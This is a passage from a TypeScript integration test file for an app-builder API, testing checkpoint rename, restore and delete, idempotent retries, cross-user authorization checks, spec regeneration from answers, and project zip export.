        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      await createRes.json();

      const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(ownerToken) });
      assert.equal(deleteRes.status, 204);
      assert.equal(emailSender.sentTo.length, 0, "an owned project with no collaborators has nobody to notify");
    },
    { emailSender },
  );
});

test("a user cannot restore another user's checkpoint into their own project by guessing/reusing its id", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner2@example.com");
    const intruderToken = await signup(baseUrl, "intruder2@example.com");

    // Owner builds a project, producing at least one real checkpoint.
    const ownerCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: ownerProject } = (await ownerCreateRes.json()) as { project: { id: string } };
    const ownerBuildRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/build`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    await collectSSE(ownerBuildRes);
    const ownerCheckpointsRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/checkpoints`, {
      headers: authHeaders(ownerToken),
    });
    const { checkpoints: ownerCheckpoints } = (await ownerCheckpointsRes.json()) as { checkpoints: { id: string }[] };
    const ownerCheckpointId = ownerCheckpoints[0].id;

    // Intruder builds their own, unrelated project.
    const intruderCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(intruderToken),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project: intruderProject } = (await intruderCreateRes.json()) as { project: { id: string } };
    const intruderBuildRes = await fetch(`${baseUrl}/api/projects/${intruderProject.id}/build`, {
      method: "POST",
      headers: authHeaders(intruderToken),
    });
    await collectSSE(intruderBuildRes);

    // Intruder owns intruderProject, but tries to restore using the owner's
    // checkpoint id -- requireOwnedProject alone would let this through
    // (the intruder really does own intruderProject); only the route's own
    // `checkpoint.projectId !== project.id` cross-check stops it.
    const crossRestoreRes = await fetch(
      `${baseUrl}/api/projects/${intruderProject.id}/checkpoints/${ownerCheckpointId}/restore`,
      { method: "POST", headers: authHeaders(intruderToken) },
    );
    assert.equal(crossRestoreRes.status, 404);
    assert.equal(((await crossRestoreRes.json()) as { code?: string }).code, "CHECKPOINT_NOT_FOUND");

    // The intruder's own project must be completely unaffected.
    const intruderProjectAfter = await fetch(`${baseUrl}/api/projects/${intruderProject.id}`, {
      headers: authHeaders(intruderToken),
    });
    const { project: intruderProjectStateAfter } = (await intruderProjectAfter.json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    assert.deepEqual(
      intruderProjectStateAfter.spec.entities.map((e) => e.name).sort(),
      ["Courier", "Order"],
    );
  });
});

/**
 * New in this round: a checkpoint's label was previously only ever the
 * automatic one build/refine gave it -- no way to give an important one a
 * name that's actually memorable months later. Confirms the real PATCH
 * route updates exactly the one checkpoint's own label via a real round
 * trip, and that it's genuinely persisted (a fresh GET reflects it, not
 * just the PATCH response echoing back what was sent).
 */
test("renaming a checkpoint's label persists via a real PATCH round trip", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { id: string; label: string }[] };
    const checkpointId = checkpoints[0].id;

    const renameRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "before the pricing overhaul" }),
    });
    assert.equal(renameRes.status, 200);
    const { checkpoint } = (await renameRes.json()) as { checkpoint: { label: string } };
    assert.equal(checkpoint.label, "before the pricing overhaul");

    const afterRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: after } = (await afterRes.json()) as { checkpoints: { id: string; label: string }[] };
    const renamed = after.find((c) => c.id === checkpointId)!;
    assert.equal(renamed.label, "before the pricing overhaul", "the new label must be genuinely persisted, not just echoed in the PATCH response");
  });
});

/**
 * Round 962: same withIdempotency gap, and the same fix, as the entity-
 * label/field-label PATCH routes' own round-960 fix -- this checkpoint
 * rename route's two immediate siblings on the exact same resource
 * (restore, round 956; delete, round 944) already got this protection,
 * but the rename sitting between them was missed. renameCheckpoint
 * (packages/db/src/checkpoints.ts) is a plain, unconditional UPDATE, so a
 * response lost in transit after a rename already committed meant a
 * retry blindly reapplied its own now-stale label a second time,
 * silently reverting a genuinely newer rename that landed in between.
 */
test("PATCH .../checkpoints/:checkpointId retried with the same idempotency key after a newer rename landed in between replays the original response, instead of reverting the newer rename back to the stale label", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "checkpoint-rename-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const checkpointsRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints } = (await checkpointsRes.json()) as { checkpoints: { id: string }[] };
    const checkpointId = checkpoints[0].id;

    const headers = { ...authHeaders(token), "x-idempotency-key": "checkpoint-rename-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(firstRes.status, 200);
    const firstBody = await firstRes.json();

    // A genuinely newer rename lands in between -- a different request,
    // no idempotency key, exactly like a second browser tab or a
    // different collaborator would send.
    const newerRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Fresher Label" }),
    });
    assert.equal(newerRes.status, 200);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${checkpointId}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ label: "Stale Label" }),
    });
    assert.equal(retryRes.status, 200);
    assert.deepEqual(await retryRes.json(), firstBody, "a retry with the same idempotency key must replay the original response verbatim, not re-run the mutation");

    const afterRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: after } = (await afterRes.json()) as { checkpoints: { id: string; label: string }[] };
    const current = after.find((c) => c.id === checkpointId)!;
    assert.equal(current.label, "Fresher Label", "the retry must never revert the genuinely newer rename back to the stale label");
  });
});

/**
 * The cross-project security counterpart to the test above, mirroring "a
 * user cannot restore another user's checkpoint" just above it: a user who
 * genuinely owns their own project must not be able to rename a DIFFERENT
 * user's checkpoint just by guessing/reusing its id.
 */
test("a user cannot rename another user's checkpoint by guessing/reusing its id", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "owner3@example.com");
    const intruderToken = await signup(baseUrl, "intruder3@example.com");

    const ownerCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: ownerProject } = (await ownerCreateRes.json()) as { project: { id: string } };
    const ownerBuildRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/build`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    await collectSSE(ownerBuildRes);
    const ownerCheckpointsRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/checkpoints`, {
      headers: authHeaders(ownerToken),
    });
    const { checkpoints: ownerCheckpoints } = (await ownerCheckpointsRes.json()) as { checkpoints: { id: string; label: string }[] };
    const ownerCheckpointId = ownerCheckpoints[0].id;
    const ownerOriginalLabel = ownerCheckpoints[0].label;

    const intruderCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(intruderToken),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project: intruderProject } = (await intruderCreateRes.json()) as { project: { id: string } };
    const intruderBuildRes = await fetch(`${baseUrl}/api/projects/${intruderProject.id}/build`, {
      method: "POST",
      headers: authHeaders(intruderToken),
    });
    await collectSSE(intruderBuildRes);

    const crossRenameRes = await fetch(
      `${baseUrl}/api/projects/${intruderProject.id}/checkpoints/${ownerCheckpointId}`,
      { method: "PATCH", headers: authHeaders(intruderToken), body: JSON.stringify({ label: "hijacked label" }) },
    );
    assert.equal(crossRenameRes.status, 404);

    const ownerCheckpointsAfter = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/checkpoints`, {
      headers: authHeaders(ownerToken),
    });
    const { checkpoints: ownerCheckpointsAfterList } = (await ownerCheckpointsAfter.json()) as { checkpoints: { id: string; label: string }[] };
    const ownerCheckpointAfter = ownerCheckpointsAfterList.find((c) => c.id === ownerCheckpointId)!;
    assert.equal(
      ownerCheckpointAfter.label,
      ownerOriginalLabel,
      "the real owner's own checkpoint label must be completely untouched by the intruder's attempt",
    );
  });
});

/**
 * New in this round: Time Machine's history otherwise only ever grows --
 * every build and every refine adds a checkpoint, with no way to prune a
 * single unwanted one (an experimental refine that went nowhere, say), the
 * same real gap round 208 closed for the WhatsApp message log. Confirms a
 * real DELETE removes exactly the one checkpoint via a real round trip,
 * and that it's genuinely gone (a fresh GET no longer lists it, not just
 * the DELETE response reporting success).
 */
test("deleting a checkpoint by id removes exactly that one, leaving the rest of the project's history untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "checkpoint-delete-owner1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);
    const refineRes = await fetch(`${baseUrl}/api/projects/${project.id}/refine`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ instruction: "Add a notes field to Customer" }),
    });
    await collectSSE(refineRes);

    const beforeRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: before } = (await beforeRes.json()) as { checkpoints: { id: string }[] };
    assert.ok(before.length >= 2, "a build followed by a refine must produce at least two checkpoints");
    const toDelete = before[0].id;

    const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${toDelete}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(deleteRes.status, 204);

    const afterRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: after } = (await afterRes.json()) as { checkpoints: { id: string }[] };
    assert.deepEqual(
      after.map((c) => c.id),
      before.filter((c) => c.id !== toDelete).map((c) => c.id),
      "deleting one checkpoint must drop only that one, keeping the rest in their original order",
    );
  });
});

/**
 * Round 944: same withIdempotency gap, and the same fix, as deleteRecord's
 * own fix (round 792) -- deleteCheckpoint (packages/db/src/checkpoints.ts)
 * throws NotFoundError once the row is actually gone, with no special case
 * for a retry. fetchWithWakeRetry retries on ANY thrown fetch() error, so a
 * response lost in transit after the checkpoint was already deleted used
 * to surface a confusing 404 for a delete that, from the user's point of
 * view, already fully succeeded.
 */
test("DELETE .../checkpoints/:checkpointId retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing on the already-deleted checkpoint", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "checkpoint-delete-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const beforeRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: before } = (await beforeRes.json()) as { checkpoints: { id: string }[] };
    const toDelete = before[0].id;

    const headers = { ...authHeaders(token), "x-idempotency-key": "checkpoint-delete-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${toDelete}`, { method: "DELETE", headers });
    assert.equal(firstRes.status, 204);

    const afterFirstRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: afterFirst } = (await afterFirstRes.json()) as { checkpoints: { id: string }[] };
    assert.ok(!afterFirst.some((c) => c.id === toDelete), "the checkpoint must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/${toDelete}`, { method: "DELETE", headers });
    assert.equal(
      retryRes.status,
      204,
      "a retried deletion with the same idempotency key must replay the original success, not 404 on the already-deleted checkpoint",
    );

    const afterRetryRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: afterRetry } = (await afterRetryRes.json()) as { checkpoints: { id: string }[] };
    assert.deepEqual(
      afterRetry.map((c) => c.id),
      afterFirst.map((c) => c.id),
      "the replayed response must leave the project's history exactly as it was after the original success",
    );
  });
});

test("deleting a checkpoint id that doesn't exist in this project 404s, and the project's own history is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "checkpoint-delete-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints/no-such-checkpoint`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}/checkpoints`, { headers: authHeaders(token) });
    const { checkpoints: unchanged } = (await getRes.json()) as { checkpoints: unknown[] };
    assert.equal(unchanged.length, 1, "the project's own history must be untouched by the failed delete attempt");
  });
});

/**
 * The cross-project security counterpart to the two tests above, mirroring
 * "a user cannot rename another user's checkpoint" just above them: a user
 * who genuinely owns their own project must not be able to delete a
 * DIFFERENT user's checkpoint just by guessing/reusing its id.
 */
test("a user cannot delete another user's checkpoint by guessing/reusing its id", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "checkpoint-delete-owner3@example.com");
    const intruderToken = await signup(baseUrl, "checkpoint-delete-intruder3@example.com");

    const ownerCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: ownerProject } = (await ownerCreateRes.json()) as { project: { id: string } };
    const ownerBuildRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/build`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    await collectSSE(ownerBuildRes);
    const ownerCheckpointsRes = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/checkpoints`, {
      headers: authHeaders(ownerToken),
    });
    const { checkpoints: ownerCheckpoints } = (await ownerCheckpointsRes.json()) as { checkpoints: { id: string }[] };
    const ownerCheckpointId = ownerCheckpoints[0].id;

    const intruderCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(intruderToken),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project: intruderProject } = (await intruderCreateRes.json()) as { project: { id: string } };
    const intruderBuildRes = await fetch(`${baseUrl}/api/projects/${intruderProject.id}/build`, {
      method: "POST",
      headers: authHeaders(intruderToken),
    });
    await collectSSE(intruderBuildRes);

    const crossDeleteRes = await fetch(
      `${baseUrl}/api/projects/${intruderProject.id}/checkpoints/${ownerCheckpointId}`,
      { method: "DELETE", headers: authHeaders(intruderToken) },
    );
    assert.equal(crossDeleteRes.status, 404);

    const ownerCheckpointsAfter = await fetch(`${baseUrl}/api/projects/${ownerProject.id}/checkpoints`, {
      headers: authHeaders(ownerToken),
    });
    const { checkpoints: ownerCheckpointsAfterList } = (await ownerCheckpointsAfter.json()) as { checkpoints: { id: string }[] };
    assert.ok(
      ownerCheckpointsAfterList.some((c) => c.id === ownerCheckpointId),
      "the real owner's own checkpoint must still exist, completely untouched by the intruder's attempt",
    );
  });
});

test("returns 400 for an empty description", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const res = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "" }),
    });
    assert.equal(res.status, 400);
  });
});

test("returns 404 for an unknown project", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const res = await fetch(`${baseUrl}/api/projects/does-not-exist`, { headers: authHeaders(token) });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "PROJECT_NOT_FOUND");
  });
});

test("rejects an insert missing a required field with 400", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const badInsert = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ email: "no-name@example.com" }),
    });
    assert.equal(badInsert.status, 400);
  });
});

test("business twin reports real counts and updates as records are added", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const tooEarly = await fetch(`${baseUrl}/api/projects/${project.id}/twin`, { headers: authHeaders(token) });
    assert.equal(tooEarly.status, 409);
    assert.equal(((await tooEarly.json()) as { code?: string }).code, "BUILD_REQUIRED");

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const twinRes = await fetch(`${baseUrl}/api/projects/${project.id}/twin`, { headers: authHeaders(token) });
    assert.equal(twinRes.status, 200);
    const { twin } = (await twinRes.json()) as {
      twin: { totalRecords: number; entities: { name: string; count: number }[]; mostActive: unknown };
    };
    // Seed Data agent already populated the new tables during build.
    assert.ok(twin.totalRecords > 0);
    assert.ok(twin.entities.some((e) => e.name === "Customer" && e.count > 0));

    await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Extra Customer", status: "New" }),
    });

    const twinRes2 = await fetch(`${baseUrl}/api/projects/${project.id}/twin`, { headers: authHeaders(token) });
    const { twin: twin2 } = (await twinRes2.json()) as { twin: { totalRecords: number } };
    assert.equal(twin2.totalRecords, twin.totalRecords + 1);
  });
});

test("entity-counts reports a real per-entity count for every entity, and updates as records are added", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const tooEarly = await fetch(`${baseUrl}/api/projects/${project.id}/entity-counts`, { headers: authHeaders(token) });
    assert.equal(tooEarly.status, 409);
    assert.equal(((await tooEarly.json()) as { code?: string }).code, "BUILD_REQUIRED");

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const countsRes = await fetch(`${baseUrl}/api/projects/${project.id}/entity-counts`, { headers: authHeaders(token) });
    assert.equal(countsRes.status, 200);
    const { counts } = (await countsRes.json()) as { counts: Record<string, number> };
    // Seed Data agent already populated the new tables during build.
    assert.ok(counts.Customer > 0);

    await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ name: "Extra Customer", status: "New" }),
    });

    const countsRes2 = await fetch(`${baseUrl}/api/projects/${project.id}/entity-counts`, { headers: authHeaders(token) });
    const { counts: counts2 } = (await countsRes2.json()) as { counts: Record<string, number> };
    assert.equal(counts2.Customer, counts.Customer + 1);
  });
});

test("answering an open question (free text, not just a suggested option) actually changes the spec used to build", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { openQuestions: { question: string; recommendation?: string }[] } };
    };
    const question = project.spec.openQuestions[0];
    assert.ok(question, "the heuristic provider should ask a payments open question here");
    assert.equal(question.recommendation, "No payments");

    // A free-text answer (not one of the quick-pick chip options) should
    // still flow back into spec regeneration.
    const answersRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ answers: [{ question: question.question, answer: "Yes, use Stripe for all payments" }] }),
    });
    assert.equal(answersRes.status, 200);
    const { project: answeredProject } = (await answersRes.json()) as {
      project: { spec: { openQuestions: { question: string; recommendation?: string }[] } };
    };
    // Mentioning "Stripe" is a real payment keyword, so the regenerated
    // spec's own open question now reflects that payments are needed --
    // proof the answer changed the spec, not just a UI checkbox.
    assert.equal(answeredProject.spec.openQuestions[0].recommendation, "Stripe");

    // Building now uses the answered (regenerated) spec, not the original.
    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(buildRes.status, 200);
    const buildEvents = await collectSSE(buildRes);
    assert.ok(buildEvents.every((e) => e.status !== "failed"));
    const finalProject = (buildEvents[buildEvents.length - 1].detail as {
      project: { spec: { openQuestions: { recommendation?: string }[] } };
    }).project;
    assert.equal(finalProject.spec.openQuestions[0].recommendation, "Stripe");

    // Submitting no non-empty answers is a harmless no-op, not an error.
    const noopRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ answers: [{ question: "some question", answer: "   " }] }),
    });
    assert.equal(noopRes.status, 200);
  });
});

/**
 * Round 776: `answers` used to be a flat `Record<string,string>` keyed by
 * question text -- so two open questions sharing identical wording
 * (OpenQuestionSchema carries no uniqueness constraint, unlike entity
 * names) could never both be answered: a plain JS object can't hold two
 * entries under the same key, so the second answer always silently
 * overwrote the first in the request body itself, before this route's own
 * code ever ran. The heuristic provider itself never generates more than
 * one open question, so the duplicate-worded spec here is written directly
 * via updateProjectSpec (the db layer), simulating what a real AI-
 * generated spec can plausibly produce. A capturing provider wrapper
 * confirms both answers reach the regeneration prompt as distinct lines.
 */
test("POST /projects/:id/answers keeps two identically-worded open questions' answers distinct in the regeneration prompt", async () => {
  let capturedDescription: string | undefined;
  const inner = new HeuristicSpecProvider();
  const provider: SpecProvider = {
    name: inner.name,
    async generate(description, isHebrewOverride) {
      capturedDescription = description;
      return inner.generate(description, isHebrewOverride);
    },
  };
  await withServer(
    async (baseUrl, db) => {
      const token = await signup(baseUrl, "dup-question1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; spec: ProductSpec } };

      const dupSpec: ProductSpec = {
        ...project.spec,
        openQuestions: [
          { question: "Which plan?", options: ["Pro", "Basic"] },
          { question: "Which plan?", options: ["Pro", "Basic"] },
        ],
      };
      updateProjectSpec(db, project.id, dupSpec);

      const res = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          answers: [
            { question: "Which plan?", answer: "Basic for this one" },
            { question: "Which plan?", answer: "Pro for the other one" },
          ],
        }),
      });
      assert.equal(res.status, 200);
      assert.ok(capturedDescription, "the provider must have been called with the combined description");
      assert.match(
        capturedDescription!,
        /Which plan\?: Basic for this one/,
        "the first identically-worded question's own answer must reach the regeneration prompt",
      );
      assert.match(
        capturedDescription!,
        /Which plan\?: Pro for the other one/,
        "the second identically-worded question's own answer must ALSO reach the prompt, not be overwritten by the first",
      );
    },
    { provider },
  );
});

test("a free-standing request on the spec review screen (not tied to any open question) also changes the spec", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string }[] } };
    };
    assert.deepEqual(project.spec.entities.map((e) => e.name).sort(), ["Customer", "Deal"]);

    // No answer to any specific question -- just a free-form request.
    const answersRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ additionalRequest: "Also track invoices for customers." }),
    });
    assert.equal(answersRes.status, 200);
    const { project: updated } = (await answersRes.json()) as {
      project: { spec: { entities: { name: string }[] } };
    };
    assert.ok(
      updated.spec.entities.some((e) => e.name === "Invoice"),
      "the free-standing request should have added an Invoice entity",
    );

    // Sending neither answers nor a request is a harmless no-op.
    const noopRes = await fetch(`${baseUrl}/api/projects/${project.id}/answers`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({}),
    });
    assert.equal(noopRes.status, 200);
    const { project: unchanged } = (await noopRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      unchanged.spec.entities.map((e) => e.name).sort(),
      updated.spec.entities.map((e) => e.name).sort(),
    );
  });
});

test("export refuses before build, and returns a real zip file after", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const tooEarly = await fetch(`${baseUrl}/api/projects/${project.id}/export`, { headers: authHeaders(token) });
    assert.equal(tooEarly.status, 409);

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const exportRes = await fetch(`${baseUrl}/api/projects/${project.id}/export`, { headers: authHeaders(token) });
    assert.equal(exportRes.status, 200);
    assert.equal(exportRes.headers.get("content-type"), "application/zip");
    assert.match(exportRes.headers.get("content-disposition") ?? "", /attachment; filename=".*\.zip"/);
    const buffer = Buffer.from(await exportRes.arrayBuffer());
    assert.equal(buffer.readUInt32LE(0), 0x04034b50); // real ZIP local-file-header magic
    assert.ok(buffer.length > 500);
  });
});

/**
 * Regression test for a real bug found by round 284's Explore survey (a
 * follow-up to round 283's entity-name-collision fix): a single, non-
 * colliding non-ASCII entity name (e.g. Hebrew) is a real, reachable case
 * -- it builds and runs fine in the live preview, since packages/db/src/
 * identifiers.ts's tableNameFor silently sanitizes it -- but codegen.ts's
 * much stricter assertSafe has always rejected it outright at export time
 * with a bare Error, which app.ts's generic error handler turned into an
 * unexplained 500 with zero indication of what went wrong. This spec
 * provider stands in for the real Anthropic provider (which occasionally
 * doesn't perfectly follow its own "ASCII names only" prompt instruction,
 * especially for a Hebrew business idea) without needing a live API key.
 */
function createNonAsciiEntityProvider(): SpecProvider {
  const spec: ProductSpec = {
    summary: "test",
    personas: [],
    roles: ["Admin"],
    entities: [{ name: "לקוח", fields: [{ name: "name", type: "text", required: true }] }],
    screens: [],
    assumptions: [],
    openQuestions: [],
  };
  return { name: "non-ascii-entity-test-provider", async generate() { return spec; } };
}

test("exporting a project whose spec has a lone non-ASCII entity name (not a collision) returns a clear, translated 422 instead of a generic 500", async () => {
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A business with customers." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      const events = await collectSSE(buildRes);
      const forge = events.find((e) => e.agent === "Forge");
      assert.equal(forge?.status, "success", "the build must genuinely succeed with the lone non-ASCII name -- this is not a rejected spec, just an unexportable one");

      const exportRes = await fetch(`${baseUrl}/api/projects/${project.id}/export`, { headers: authHeaders(token) });
      assert.equal(exportRes.status, 422, "must be a clear, actionable error, not a generic 500");
      const body = (await exportRes.json()) as { error: string; code: string };
